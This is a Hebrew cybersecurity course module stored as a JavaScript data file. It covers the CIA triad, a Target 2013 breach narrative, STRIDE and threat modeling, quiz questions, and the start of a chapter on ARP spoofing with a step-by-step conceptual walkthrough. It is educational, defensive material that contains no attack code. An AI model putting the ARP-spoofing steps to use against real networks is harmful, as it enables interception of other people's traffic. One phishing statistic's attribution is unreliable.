export const chapters101to105 = [
  // ========== CHAPTER 101: CIA Triad ==========
  {
    id: 101,
    title: "CIA Triad — יסודות אבטחת מידע",
    pages: [
      {
        type: "story",
        title: "Black Friday 2013 — היום שבו Target נפרצה",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
<p><strong>תרחיש:</strong> נובמבר 2013. Black Friday. אתה ה-CISO של <code>Target</code>, רשת הקמעונאות השנייה בגודלה בארה"ב. 1,800 סניפים. עשרות מיליוני לקוחות בשבוע הכי רווחי בשנה.</p>
</div>

<p>בחדר ה-<code>SOC</code> שלך בתוך הבניין הראשי במינסוטה, מערכת ה-<code>FireEye</code> שהתקנת לפני חודשיים מעלה התראה אדומה. משהו מוזר ברשת. הצוות שלך מסתכל על ההתראה ו... מתעלם ממנה.</p>

<p>בדיוק באותו רגע, על עשרות אלפי מכשירי קופה (<code>POS</code>) ב-1,800 סניפים, תוכנה זדונית בשם <code>BlackPOS</code> לוכדת כל החלקת כרטיס אשראי. הנתונים נשאבים מהזיכרון — <strong>לפני</strong> שהם מוצפנים.</p>

<div class="warning-box"><strong>⚠️ התוצאה:</strong></div>
<div style="display:flex;gap:12px;flex-wrap:wrap;margin:12px 0;">
<div class="stat-highlight"><span class="stat-number">40M</span><span class="stat-unit">כרטיסי אשראי נגנבו</span></div>
<div class="stat-highlight"><span class="stat-number">70M</span><span class="stat-unit">רשומות אישיות נחשפו</span></div>
<div class="stat-highlight"><span class="stat-number">$1B+</span><span class="stat-unit">עלות כוללת לחברה</span></div>
</div>
<p>ה-CEO וה-CISO — התפטרו.</p>

<p><strong>איך זה קרה? — שרשרת התקיפה:</strong></p>
<div class="attack-chain">
<div class="attack-step"><div class="attack-step-content"><strong>Reconnaissance</strong><p>התוקפים מזהים ש-Target עובדת עם <code>Fazio Mechanical</code> — חברת HVAC קטנה עם גישה מרחוק לרשת.</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>Initial Access</strong><p>מייל <code>phishing</code> לעובד של Fazio. גניבת סיסמה. כניסה דרך פורטל הספקים.</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>Lateral Movement</strong><p>הרשת הפנימית של Target <strong>לא הייתה מפולחת</strong>. מפורטל הספקים — ישירות למערכות הקופה.</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>Exfiltration</strong><p>תוכנת <code>BlackPOS</code> על עשרות אלפי קופות. כל החלקת כרטיס נלכדת מהזיכרון.</p></div></div>
</div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> הסיפור הזה הוא הדוגמה המושלמת לכשל ב-CIA Triad: פגיעה ב-<code>Confidentiality</code> (נתוני כרטיסים נגנבו), ב-<code>Integrity</code> (הותקנה תוכנה זדונית על הקופות), וב-<code>Availability</code> (הפעולות העסקיות נפגעו). כל שלושת העמודים קרסו בבת אחת.</div>
</div>`
      },
      {
        type: "explanation",
        title: "CIA Triad — שלושת עמודי התווך",
        content: `<div dir="rtl">
<p><strong>לפני שמדברים על כלים, מתקפות, או firewalls — צריך להבין מה בעצם אנחנו מגנים עליו.</strong></p>
<p>כל בעיית אבטחה בעולם ניתנת לסיווג לפגיעה באחד (או יותר) משלושה עקרונות:</p>

<div style="display:flex;gap:12px;flex-wrap:wrap;margin:16px 0;">
<div style="flex:1;min-width:200px;background:linear-gradient(135deg,#7f1d1d,#450a0a);border:2px solid #ef4444;border-radius:12px;padding:16px;">
<p style="font-size:1.3em;margin:0;">🔒 <code>Confidentiality</code> — סודיות</p>
<p style="margin:8px 0 0;">רק מי שמורשה יכול <strong>לראות</strong> את המידע.</p>
<p style="margin:4px 0 0;font-size:0.9em;color:#fca5a5;"><strong>איומים:</strong> <code>Sniffing</code>, <code>Data Breach</code>, <code>Social Engineering</code></p>
<p style="margin:4px 0 0;font-size:0.9em;color:#86efac;"><strong>הגנות:</strong> הצפנה, <code>ACL</code>, <code>MFA</code>, <code>DLP</code></p>
</div>
<div style="flex:1;min-width:200px;background:linear-gradient(135deg,#14532d,#052e16);border:2px solid #22c55e;border-radius:12px;padding:16px;">
<p style="font-size:1.3em;margin:0;">🛡️ <code>Integrity</code> — שלמות</p>
<p style="margin:8px 0 0;">המידע לא שונה ללא הרשאה. מה שנשלח = מה שהתקבל.</p>
<p style="margin:4px 0 0;font-size:0.9em;color:#fca5a5;"><strong>איומים:</strong> <code>Tampering</code>, <code>MITM</code>, <code>SQL Injection</code></p>
<p style="margin:4px 0 0;font-size:0.9em;color:#86efac;"><strong>הגנות:</strong> <code>Hashing</code>, <code>Digital Signatures</code>, <code>Audit Logs</code></p>
</div>
<div style="flex:1;min-width:200px;background:linear-gradient(135deg,#1e3a5f,#0c1929);border:2px solid #3b82f6;border-radius:12px;padding:16px;">
<p style="font-size:1.3em;margin:0;">⚡ <code>Availability</code> — זמינות</p>
<p style="margin:8px 0 0;">המערכת עובדת ונגישה <strong>כשצריך</strong> אותה.</p>
<p style="margin:4px 0 0;font-size:0.9em;color:#fca5a5;"><strong>איומים:</strong> <code>DDoS</code>, <code>Ransomware</code>, כשלי חומרה</p>
<p style="margin:4px 0 0;font-size:0.9em;color:#86efac;"><strong>הגנות:</strong> <code>Redundancy</code>, <code>Backups</code>, <code>Rate Limiting</code>, <code>CDN</code></p>
</div>
</div>

<div class="key-point"><strong>💡 כלל הזהב:</strong> כשאתה שומע על פריצה או תקרית אבטחה — תשאל תמיד: <em>"איזה עמוד של CIA נפגע?"</em> — זה הבסיס לכל חשיבה אבטחתית.</div>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">🔒</div><div class="mini-card-title">Confidentiality</div><div class="mini-card-desc">סודיות — רק מורשים רואים את המידע. הגנות: הצפנה, ACL, MFA, DLP</div></div>
<div class="mini-card"><div class="mini-card-icon">🛡️</div><div class="mini-card-title">Integrity</div><div class="mini-card-desc">שלמות — המידע לא שונה ללא הרשאה. הגנות: Hashing, Digital Signatures, Audit Logs</div></div>
<div class="mini-card"><div class="mini-card-icon">⚡</div><div class="mini-card-title">Availability</div><div class="mini-card-desc">זמינות — המערכת עובדת ונגישה כשצריך. הגנות: Redundancy, Backups, CDN</div></div>
</div>

<p>שים לב: לפעמים יש מתח בין העקרונות. הצפנה חזקה מחזקת <code>Confidentiality</code> אבל עלולה לפגוע ב-<code>Availability</code> (ביצועים). הרשאות נוקשות מחזקות <code>Integrity</code> אבל מקשות על גישה. אבטחת מידע היא תמיד <strong>איזון</strong>.</p>
</div>`
      },
      {
        type: "demo",
        title: "אתגר הבלש — איזה עיקרון הופר?",
        content: `<div dir="rtl">
<p><strong>בוא נשחק בבלש סייבר.</strong> לפניך 6 תקריות אבטחה אמיתיות. המשימה: לזהות איזה עיקרון של <code>CIA</code> הופר בכל מקרה.</p>

<div style="background:#1e293b;border-radius:10px;padding:16px;margin:12px 0;">
<p><strong>🔴 מקרה 1: Equifax 2017</strong></p>
<p>147 מיליון רשומות אישיות (שמות, SSN, תאריכי לידה) נחשפו דרך <code>Apache Struts vulnerability</code> שלא תוקנה.</p>
<div class="code-preview"><pre><code>CVE-2017-5638 — Apache Struts2 RCE
הפגיעות הייתה ידועה חודשיים לפני שנוצלה.
Equifax לא עדכנו.</code></pre></div>
<p><span class="phase-badge phase-red">Confidentiality</span> מידע אישי נחשף למי שלא מורשה.</p>
</div>

<div style="background:#1e293b;border-radius:10px;padding:16px;margin:12px 0;">
<p><strong>🔴 מקרה 2: NotPetya 2017</strong></p>
<p>נוזקת <code>wiper</code> (לא באמת <code>ransomware</code>) השמידה מערכות של Maersk, Merck, FedEx. Maersk התקינה מחדש 45,000 מחשבים ו-4,000 שרתים.</p>
<p><span class="phase-badge phase-blue">Availability</span> חברות שלמות הפסיקו לפעול במשך שבועות.</p>
</div>

<div style="background:#1e293b;border-radius:10px;padding:16px;margin:12px 0;">
<p><strong>🔴 מקרה 3: SolarWinds 2020</strong></p>
<p>תוקפים (APT29, רוסיה) הזריקו <code>backdoor</code> לתוך עדכון התוכנה הרשמי של <code>SolarWinds Orion</code>. 18,000 ארגונים התקינו את העדכון הנגוע — כולל ה-Pentagon וה-Treasury.</p>
<p><span class="phase-badge phase-green">Integrity</span> קוד רשמי שונה ע"י תוקפים. אי אפשר היה לסמוך על שלמות התוכנה.</p>
</div>

<div style="background:#1e293b;border-radius:10px;padding:16px;margin:12px 0;">
<p><strong>🔴 מקרה 4: Colonial Pipeline 2021</strong></p>
<p><code>Ransomware</code> (DarkSide) השבית את צינור הדלק הגדול ביותר בחוף המזרחי של ארה"ב. תחנות דלק התרוקנו. שולם כופר של $4.4M.</p>
<p><span class="phase-badge phase-blue">Availability</span> (ראשית) + <span class="phase-badge phase-red">Confidentiality</span> (נגנבו 100GB של נתונים לפני ההצפנה).</p>
</div>

<div style="background:#1e293b;border-radius:10px;padding:16px;margin:12px 0;">
<p><strong>🔴 מקרה 5: Stuxnet 2010</strong></p>
<p>תולעת שתוכנתה (ככל הנראה ע"י ארה"ב וישראל) כדי <strong>לשנות את מהירות הצנטריפוגות</strong> במתקן העשרת האורניום בנתנז, איראן — בלי שהמפעילים ידעו.</p>
<p><span class="phase-badge phase-green">Integrity</span> הנתונים שהמפעילים ראו היו שקריים. המכונות נהרסו בזמן שהמסכים הציגו "הכל תקין".</p>
</div>

<div class="key-point"><strong>💡 שים לב:</strong> תקריות אמיתיות כמעט תמיד פוגעות ביותר מעיקרון אחד. <code>Ransomware</code> למשל פוגע ב-<code>Availability</code> (הצפנה), ב-<code>Confidentiality</code> (גניבת נתונים), ולפעמים ב-<code>Integrity</code> (שינוי קבצים).</div>
</div>`
      },
      {
        type: "explanation",
        title: "STRIDE — מיפוי איומים כמו בלש",
        content: `<div dir="rtl">
<p><strong>עכשיו שאתה יודע מה להגן עליו (CIA), צריך לדעת <em>מה יכול להשתבש</em>.</strong></p>
<p>לשם כך, Microsoft פיתחה בשנות ה-90 את מודל <code>STRIDE</code> — שיטה סיסטמטית לזהות איומים.</p>

<p>דמיין שאתה בלש סייבר. יש לך 6 "חשודים" — 6 סוגי תקיפה. המשימה שלך: לבדוק לכל רכיב במערכת — האם הוא חשוף לאחד (או יותר) מהחשודים האלה?</p>

<table class="content-table">
  <tr><th>🔤</th><th>איום</th><th>נגד מי ב-CIA</th><th>דוגמה מהעולם האמיתי</th><th>שאלה לשאול</th></tr>
  <tr><td><strong>S</strong></td><td><code>Spoofing</code> — התחזות</td><td>Authentication</td><td><code>Email spoofing</code>, <code>ARP poisoning</code></td><td>"האם מישהו יכול להתחזות למישהו אחר?"</td></tr>
  <tr><td><strong>T</strong></td><td><code>Tampering</code> — שינוי</td><td>Integrity</td><td><code>SQL injection</code>, <code>MITM</code> שמשנה תוכן</td><td>"האם מישהו יכול לשנות נתונים בדרך?"</td></tr>
  <tr><td><strong>R</strong></td><td><code>Repudiation</code> — הכחשה</td><td>Non-repudiation</td><td>"לא אני מחקתי את הקבצים!"</td><td>"האם יש הוכחה למי עשה מה?"</td></tr>
  <tr><td><strong>I</strong></td><td><code>Info Disclosure</code> — דליפה</td><td>Confidentiality</td><td>הודעת שגיאה שחושפת מבנה DB</td><td>"האם מידע רגיש יכול לדלוף?"</td></tr>
  <tr><td><strong>D</strong></td><td><code>Denial of Service</code></td><td>Availability</td><td><code>SYN Flood</code>, <code>Slowloris</code></td><td>"האם מישהו יכול להשבית את זה?"</td></tr>
  <tr><td><strong>E</strong></td><td><code>Elevation of Privilege</code></td><td>Authorization</td><td><code>Buffer overflow</code> → <code>root</code></td><td>"האם מישהו יכול לקבל הרשאות שלא מגיעות לו?"</td></tr>
</table>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">🎭</div><div class="mini-card-title">Spoofing</div><div class="mini-card-desc">התחזות — מישהו מתחזה למישהו אחר. נגד Authentication.</div></div>
<div class="mini-card"><div class="mini-card-icon">🔧</div><div class="mini-card-title">Tampering</div><div class="mini-card-desc">שינוי נתונים ללא הרשאה. נגד Integrity.</div></div>
<div class="mini-card"><div class="mini-card-icon">🙈</div><div class="mini-card-title">Repudiation</div><div class="mini-card-desc">הכחשת פעולות שבוצעו. נגד Non-repudiation.</div></div>
<div class="mini-card"><div class="mini-card-icon">🔓</div><div class="mini-card-title">Info Disclosure</div><div class="mini-card-desc">דליפת מידע רגיש. נגד Confidentiality.</div></div>
<div class="mini-card"><div class="mini-card-icon">💥</div><div class="mini-card-title">Denial of Service</div><div class="mini-card-desc">השבתת שירות. נגד Availability.</div></div>
<div class="mini-card"><div class="mini-card-icon">👑</div><div class="mini-card-title">Elevation of Privilege</div><div class="mini-card-desc">קבלת הרשאות לא מורשות. נגד Authorization.</div></div>
</div>

<div class="key-point"><strong>💡 איך משתמשים בזה בפועל:</strong> ציירו דיאגרמת זרימה של המערכת. לכל קו ולכל רכיב — שאלו את 6 השאלות של STRIDE. כתבו את התשובות. מזל טוב — עשיתם <code>Threat Modeling</code>.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Threat Modeling בפועל — צעד אחר צעד",
        content: `<div dir="rtl">
<p><strong><code>Threat Modeling</code> הוא לא תיאוריה — זה תהליך מעשי שכל מפתח וארכיטקט צריך לדעת.</strong></p>

<p>ניקח דוגמה: אתה בונה אפליקציית בנקאות פשוטה עם <code>React frontend</code>, <code>Node.js API</code>, ו-<code>PostgreSQL</code>.</p>

<p><strong>שלב 1: שרטוט (Data Flow Diagram)</strong></p>
<div class="code-preview"><pre><code>  [User Browser] ──HTTPS──→ [Load Balancer]
                                    │
                              [Node.js API]
                               │         │
                        [PostgreSQL]   [Redis Cache]
                                          │
                               [3rd Party Payment API]</code></pre></div>

<p><strong>שלב 2: זיהוי Trust Boundaries</strong></p>
<p>כל מקום שבו נתונים עוברים בין "אזורי אמון" — זו נקודת סיכון.</p>
<ul>
<li>בין הדפדפן ל-API — <strong>אי אפשר לסמוך על הדפדפן</strong></li>
<li>בין ה-API ל-DB — <strong>אם ה-API נפרץ, מה קורה ל-DB?</strong></li>
<li>בין ה-API ל-Payment API — <strong>מה אם ה-response מזויף?</strong></li>
</ul>

<p><strong>שלב 3: הרץ STRIDE על כל קו</strong></p>
<table class="content-table">
  <tr><th>נקודה</th><th>S</th><th>T</th><th>R</th><th>I</th><th>D</th><th>E</th></tr>
  <tr><td>Browser → API</td><td>Cookie theft</td><td>Request tampering</td><td>מי שלח?</td><td>Data in URL</td><td>Rate flood</td><td>Admin bypass</td></tr>
  <tr><td>API → DB</td><td>—</td><td>SQLi</td><td>No audit</td><td>Verbose errors</td><td>Connection pool</td><td>SQL as root</td></tr>
  <tr><td>API → Payment</td><td>Fake callback</td><td>Amount change</td><td>—</td><td>API key leak</td><td>Timeout</td><td>—</td></tr>
</table>

<p><strong>שלב 4: תעדוף</strong></p>
<p>לא כל איום שווה. משתמשים ב-<code>DREAD</code> scoring או <code>CVSS</code> כדי לתעדף.</p>

<div class="attack-chain defense-chain">
<div class="attack-step"><div class="attack-step-content"><strong>1. שרטוט DFD</strong><p>ציור Data Flow Diagram — כל הרכיבים, זרימות נתונים, ואזורי אמון</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>2. זיהוי Trust Boundaries</strong><p>סימון כל נקודה שבה נתונים עוברים בין אזורי אמון שונים</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>3. הרצת STRIDE</strong><p>שאילת 6 שאלות STRIDE על כל קו וכל רכיב בדיאגרמה</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong>4. תעדוף עם DREAD/CVSS</strong><p>דירוג כל איום לפי סבירות והשפעה — טיפול בקריטיים קודם</p></div></div>
</div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>Threat Modeling</code> הוא ההשקעה הכי זולה באבטחה — עושים אותו <strong>לפני</strong> שכותבים קוד, לא אחרי שהמערכת בפרודקשן.</div>

<div class="chapter-summary"><h4>📋 סיכום פרק 101</h4><ul>
<li><strong>CIA Triad</strong> — שלושת העמודים: Confidentiality, Integrity, Availability</li>
<li><strong>STRIDE</strong> — 6 סוגי איומים למיפוי סיסטמטי: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation</li>
<li><strong>Threat Modeling</strong> — תהליך מעשי: DFD → Trust Boundaries → STRIDE → תעדוף</li>
<li>כל תקרית אבטחה ניתנת לסיווג לפי CIA — זה הבסיס לכל חשיבה אבטחתית</li>
</ul></div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – פרדוקסים באבטחת מידע",
        intro: "<p>אבטחת מידע מלאה בסתירות מעניינות. בואו נחשוב על כמה מהן...</p>",
        blocks: [
          {
            title: "פרדוקס הנעילה",
            icon: "🔐",
            content: "המערכת הכי מאובטחת בעולם היא מחשב מנותק מהחשמל, סגור בכספת, שקוע בבטון. אבל מערכת כזו גם חסרת תועלת לחלוטין — Availability אפס. איך מאזנים בין אבטחה מקסימלית לבין שימושיות? חשוב על דוגמה: בית חולים. אם הרופא צריך 15 דקות של אימות כדי לגשת לתיק חולה — חיים בסכנה. אם אין אימות בכלל — פרטיות בסכנה."
          },
          {
            title: "פרדוקס השקיפות",
            icon: "🪟",
            content: "קוד פתוח (Open Source) חושף את כל הקוד לעולם — כולל לתוקפים. אז למה רוב מומחי האבטחה מעדיפים קוד פתוח על סגור? כי 'Security through obscurity' (אבטחה דרך הסתרה) לא עובדת. כשאלפי עיניים בודקות את הקוד, באגים מתגלים מהר יותר. OpenSSL, Linux, Signal — כולם קוד פתוח ונחשבים מאובטחים."
          },
          {
            title: "הדילמה של הדלת האחורית",
            icon: "🚪",
            content: "ממשלות רוצות 'דלת אחורית' בהצפנה כדי לתפוס פושעים. אבל דלת אחורית לממשלה = דלת אחורית לכל תוקף שמגלה אותה. Juniper Networks גילו ב-2015 backdoor בתוכנת ה-VPN שלהם — שככל הנראה הושתלה ע\"י סוכנות ביון ואז נוצלה ע\"י אחרים. אפשר לבנות הצפנה חזקה, או הצפנה עם דלת אחורית. אי אפשר את שניהם."
          },
          {
            title: "מבחן מחשבה: מה עדיף?",
            icon: "🧠",
            content: "נניח שיש לך תקציב לבחור אחד מהשניים: (א) Firewall מתקדם ב-$500K, או (ב) הדרכת אבטחה לכל 500 העובדים ב-$500K. סטטיסטית, 91% מהפריצות מתחילות ב-phishing (Verizon DBIR 2023). ה-Firewall לא יעצור מייל phishing שעובד לוחץ עליו. אז אולי ההדרכה שווה יותר? אבל אנשים שוכחים — ו-Firewall לא שוכח. אין תשובה נכונה אחת."
          }
        ]
      },
      {
        type: "questions",
        title: "שאלות — CIA Triad ו-Threat Modeling",
        titleEn: "Questions — CIA Triad & Threat Modeling",
        questions: [
          {
            q: "מתקפת Ransomware מצפינה את כל הקבצים בשרת ודורשת כופר. איזה עיקרון של CIA נפגע באופן ישיר?",
            a: "Availability — הקבצים קיימים אבל לא נגישים (מוצפנים). בנוסף, אם התוקפים גם גונבים נתונים לפני ההצפנה (כמו שנפוץ ב-double extortion), נפגע גם Confidentiality.\n\nעיקרי:\n- Availability: הנתונים לא זמינים לשימוש\n- Confidentiality: אם יש exfiltration\n- Integrity: לפעמים — הנתונים שונו (הוצפנו)\n\nטיפ:\nRansomware מודרני כמעט תמיד כולל גניבת נתונים, לא רק הצפנה. לכן כמעט תמיד נפגעים לפחות שני עמודים.",
            qEn: "A ransomware attack encrypts all server files and demands payment. Which CIA principle is directly impacted?",
            aEn: "Availability — files exist but are inaccessible. If attackers also exfiltrate data before encryption (common in double extortion), Confidentiality is also impacted."
          },
          {
            q: "תוקף מבצע MITM ומשנה סכום העברה בנקאית מ-100 ש\"ח ל-10,000 ש\"ח. איזה עיקרון הופר?",
            a: "Integrity — הנתונים שונו במעבר בין השולח למקבל. השולח שלח 100 ש\"ח, אבל מה שהגיע לבנק היה 10,000 ש\"ח.\n\nעיקרי:\n- Integrity: הנתון (הסכום) שונה ללא הרשאה\n- Confidentiality: גם נפגע — התוקף ראה את התוכן\n\nטיפ:\nהצפנה (TLS) לבדה לא מספיקה אם התוקף פורץ את ה-certificate chain. צריך גם Digital Signatures על הנתונים עצמם.",
            qEn: "An attacker performs MITM and changes a bank transfer from 100 to 10,000. Which principle is violated?",
            aEn: "Integrity — the data was modified in transit without authorization. The sender sent 100 but the bank received 10,000."
          },
          {
            q: "הסבר מהו STRIDE ומה הקשר שלו ל-CIA Triad.",
            a: "STRIDE הוא מודל לזיהוי איומים שפותח ע\"י Microsoft. כל אות מייצגת סוג איום:\n- S = Spoofing (התחזות) → נגד Authentication\n- T = Tampering (שינוי) → נגד Integrity\n- R = Repudiation (הכחשה) → נגד Non-repudiation\n- I = Info Disclosure (דליפה) → נגד Confidentiality\n- D = Denial of Service → נגד Availability\n- E = Elevation of Privilege → נגד Authorization\n\nעיקרי:\n- STRIDE הוא כלי למיפוי סיסטמטי של איומים\n- כל סוג איום פוגע בחלק אחר של CIA + אימות/הרשאות\n- משתמשים בו בתהליך Threat Modeling\n\nטיפ:\nהריצו STRIDE על כל trust boundary בדיאגרמת המערכת — שם הסיכון הכי גבוה.",
            qEn: "Explain STRIDE and its relationship to the CIA Triad.",
            aEn: "STRIDE is a threat identification model by Microsoft. Each letter represents a threat type that maps to security properties: Spoofing→Authentication, Tampering→Integrity, Repudiation→Non-repudiation, Information Disclosure→Confidentiality, DoS→Availability, Elevation of Privilege→Authorization."
          },
          {
            q: "מהו Attack Surface ואיך מצמצמים אותו? תן 4 דוגמאות.",
            a: "Attack Surface הוא כל נקודות הכניסה האפשריות למערכת — כל מקום שתוקף יכול לנסות לתקוף.\n\nדוגמאות לצמצום:\n1. סגירת ports שלא בשימוש — כל port פתוח = נקודת כניסה\n2. הסרת dependencies מיותרים — כל npm package = קוד שלא כתבת, עם באגים שלא ידעת\n3. עיקרון least privilege — עובד מקבל רק הרשאות שהוא צריך, לא יותר\n4. מחיקת API endpoints שלא בשימוש — כל endpoint = attack surface\n\nעיקרי:\n- פחות קוד = פחות באגים = פחות חולשות\n- עיקרון \"deny by default\" — ברירת מחדל היא חסימה\n\nטיפ:\nהריצו nmap על השרת שלכם. כל port פתוח שלא ציפיתם לו = attack surface מיותר.",
            qEn: "What is Attack Surface and how do you reduce it? Give 4 examples.",
            aEn: "Attack Surface is all possible entry points to a system. Reduce by: 1) Close unused ports, 2) Remove unnecessary dependencies, 3) Apply least privilege, 4) Remove unused API endpoints."
          },
          {
            q: "בסיפור של Target 2013 — מה היה הכשל העיקרי ואיזה עיקרון אבטחתי היה פותר את הבעיה?",
            a: "הכשל העיקרי: חוסר Network Segmentation. לספק HVAC הייתה גישה לאותה רשת שבה נמצאות מערכות הקופה (POS).\n\nהעיקרון שהיה פותר: Defense in Depth + Least Privilege.\n\nעיקרי:\n- הרשת של הספקים הייתה צריכה להיות VLAN נפרד\n- אין סיבה שטכנאי מיזוג אוויר יוכל לגשת למערכות קופה\n- גם מערכת FireEye התריעה — הצוות התעלם\n\nטיפ:\nזו טעות נפוצה מאוד. חברות משקיעות מיליונים ב-Firewalls אבל שוכחות לפלח את הרשת הפנימית. Assume Breach = תמיד תניח שמישהו כבר בפנים.",
            qEn: "In the Target 2013 story, what was the main failure and which security principle would have prevented it?",
            aEn: "Main failure: lack of network segmentation. The HVAC vendor had access to the same network as POS systems. Defense in Depth + Least Privilege (separate VLANs, no vendor access to payment systems) would have prevented lateral movement."
          }
        ]
      }
    ]
  },

  // ========== CHAPTER 102: Network Attacks ==========
  {
    id: 102,
    title: "מתקפות רשת — TCP/IP כנשק",
    pages: [
      {
        type: "story",
        title: "בית הקפה — 10 דקות לגניבת Session",
        content: `<div dir="rtl">
<p><strong>יום שלישי, 14:30. בית קפה בתל אביב.</strong></p>
<p>אתה יושב עם הלפטופ, מחובר ל-WiFi של "CafeNeto_Free". שולח מייל, בודק חשבון בנק, נכנס ל-Slack של העבודה. הכל נורמלי.</p>

<p>שלושה שולחנות ממך, בחור עם לפטופ שחור מחייך לעצמו. הוא לא גולש באינטרנט — הוא <strong>מאזין לכל מה שאתה עושה</strong>.</p>

<p>לפני 5 דקות הוא הפעיל סקריפט פשוט. שורה אחת של <code>arpspoof</code>. מאותו רגע, כל תקשורת ה-WiFi שלך — עוברת דרכו. הוא רואה לאן אתה גולש. אם אתר לא משתמש ב-<code>HTTPS</code> — הוא רואה הכל. סיסמאות, הודעות, cookies.</p>

<div class="warning-box"><strong>⚠️ זה אמיתי:</strong> התקפת <code>ARP Spoofing</code> ברשת WiFi פתוחה לוקחת פחות מדקה להפעלה. כל מי שמחובר לאותה רשת חשוף. זו לא תיאוריה — זו פרקטיקה שכל סטודנט לסייבר לומד בסמסטר הראשון.</div>

<p>ב-2015, חוקר אבטחה ישב בלובי של כנס DEF CON והריץ <code>WiFi Pineapple</code> — מכשיר בגודל ראוטר שיוצר רשת WiFi מזויפת. תוך שעה, 300 מכשירים התחברו אליו אוטומטית. הוא לא פרץ אף אחד — <strong>הם התחברו אליו מרצון</strong>.</p>

<div class="incident-timeline">
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">14:25</div><div class="timeline-desc">התוקף מתיישב בבית הקפה, מתחבר ל-WiFi הציבורי</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">14:27</div><div class="timeline-desc">מפעיל <code>arpspoof</code> — כל התעבורה עוברת דרכו</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">14:30</div><div class="timeline-desc">הקורבן מתחבר לבנק ב-HTTP — סיסמה נלכדת</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">14:32</div><div class="timeline-desc">Cookie של Slack נגנב — גישה לחשבון עבודה</div></div>
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">14:35</div><div class="timeline-desc">התוקף סוגר לפטופ ויוצא — הקורבן לא חשד בכלום</div></div>
</div>

<p>הפרק הזה עוסק בהתקפות על פרוטוקולי רשת — <code>ARP Spoofing</code>, <code>SYN Flood</code>, <code>DDoS</code>. כל אחת מנצלת חולשה מובנית בפרוטוקולים שתוכננו בשנות ה-70 ו-80, כש<strong>אף אחד לא חשב על אבטחה</strong>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "ARP Spoofing — צעד אחר צעד",
        content: `<div dir="rtl">
<p><strong><code>ARP</code> — הפרוטוקול שנולד בלי אבטחה</strong></p>
<p><code>ARP</code> (Address Resolution Protocol) ממפה כתובת <code>IP</code> לכתובת <code>MAC</code>. כשמחשב רוצה לשלוח packet למישהו ברשת המקומית, הוא שואל: "מי הוא 192.168.1.1? תגיד לי את ה-MAC שלך."</p>

<p><strong>הבעיה הקריטית:</strong> <code>ARP</code> הוא <code>stateless</code> ו-<code>trustless</code>. אין אימות. אין חתימה. כל מכשיר ברשת יכול לענות "אני 192.168.1.1" — גם אם הוא לא.</p>

<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 400 200" class="content-diagram">
  <text x="200" y="18" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">ARP Spoofing — Man in the Middle</text>

  <rect x="20" y="40" width="90" height="40" rx="6" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="65" y="58" text-anchor="middle" font-size="10" fill="#7dd3fc">Victim</text>
  <text x="65" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">192.168.1.5</text>

  <rect x="155" y="100" width="90" height="40" rx="6" fill="#7f1d1d" stroke="#ef4444" stroke-width="2"/>
  <text x="200" y="118" text-anchor="middle" font-size="10" fill="#fca5a5">Attacker</text>
  <text x="200" y="132" text-anchor="middle" font-size="8" fill="#fca5a5">192.168.1.99</text>

  <rect x="290" y="40" width="90" height="40" rx="6" fill="#14532d" stroke="#22c55e" stroke-width="1.5"/>
  <text x="335" y="58" text-anchor="middle" font-size="10" fill="#86efac">Gateway</text>
  <text x="335" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">192.168.1.1</text>

  <line x1="110" y1="60" x2="160" y2="105" stroke="#ef4444" stroke-width="2" stroke-dasharray="6,3"/>
  <line x1="240" y1="105" x2="290" y2="60" stroke="#ef4444" stroke-width="2" stroke-dasharray="6,3"/>

  <text x="120" y="78" font-size="8" fill="#fca5a5">① Traffic →</text>
  <text x="260" y="78" font-size="8" fill="#fca5a5">② Forward →</text>

  <text x="65" y="110" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="65" y="125" text-anchor="middle" font-size="7" fill="#fca5a5">GW MAC = ATTACKER!</text>

  <text x="335" y="110" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="335" y="125" text-anchor="middle" font-size="7" fill="#fca5a5">Victim MAC = ATTACKER!</text>

  <text x="200" y="170" text-anchor="middle" font-size="9" fill="#f87171">התוקף שולח ARP replies מזויפים לשני הצדדים</text>
  <text x="200" y="185" text-anchor="middle" font-size="8" fill="#94a3b8">→ כל הטראפיק עובר דרכו: קריאה, שינוי, הזרקה</text>
</svg>
</div>

<p><strong>מה קורה בפועל, שלב אחר שלב:</strong></p>
<ol>
<li><strong>שלב 1:</strong> התוקף שולח <code>ARP Reply</code> לקורבן: "אני ה-Gateway (192.168.1.1), ה-MAC שלי הוא XX:XX" (ה-MAC של התוקף)</li>
<li><strong>שלב 2:</strong> התוקף שולח <code>ARP Reply</code> ל-Gateway: "אני הקורבן (192.168.1.5), ה-MAC שלי הוא XX:XX"</li>
<li><strong>שלב 3:</strong> שני הצדדים מעדכנים את טבלת ה-<code>ARP</code> שלהם. מעכשיו — כל התקשורת עוברת דרך התוקף</li>
<li><strong>שלב 4:</strong> התוקף מפעיל <code>IP forwarding</code> כדי לא לנתק את הקורבן (אחרת ירגישו שמשהו לא בסדר)</li>
</ol>

<div class="vs-container">
